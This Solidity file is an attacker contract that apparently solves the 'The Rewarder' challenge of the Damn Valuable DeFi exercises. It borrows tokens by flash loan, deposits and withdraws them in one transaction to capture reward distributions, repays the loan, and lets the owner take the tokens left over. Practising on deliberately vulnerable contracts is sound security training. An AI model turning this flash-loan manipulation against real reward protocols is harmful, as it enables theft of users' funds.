// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solmate/src/auth/Owned.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract TheRewarderAttacker is Owned {
    TheRewarderPool target;

    constructor(TheRewarderPool _target) Owned(msg.sender) {
        target = _target;
    }

    function attack(FlashLoanerPool loanPool, uint256 amount) onlyOwner external {
        loanPool.flashLoan(amount);
    }

    function withdraw(ERC20 token) onlyOwner external {
        token.transfer(address(msg.sender), token.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        DamnValuableToken token = FlashLoanerPool(msg.sender).liquidityToken();
        token.approve(address(target), amount);
        target.deposit(amount);
        target.withdraw(amount);

        token.transfer(msg.sender, amount);
    }
}